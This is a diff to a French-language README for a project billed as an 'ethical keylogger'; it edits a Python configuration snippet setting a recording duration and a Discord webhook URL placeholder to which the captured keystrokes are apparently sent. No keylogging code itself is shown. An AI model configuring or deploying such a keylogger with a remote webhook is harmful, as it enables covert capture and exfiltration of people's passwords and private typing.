@@ -19,11 +19,9 @@ Ce projet open source propose un keylogger éthique qui enregistre les frappes d
 2. **Modification du code :**
 
 ```python
-# Exemple de Configuration
-DOCUMENTS_PATH = "chemin/vers/votre/dossier/Documents"
-FILE_PATH = "keylogger.txt"
-RECORD_DURATION = 60 # Temps à changer à exprimer en secondes
-WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_url"
+# Configuration
+RECORD_DURATION = 10  # Temps en secondes
+WEBHOOK_URL = "VOTRE API DISCORD WEBHOOK"  # Renseignez votre API
 ```
 
 3. **Exécution du Keylogger:**
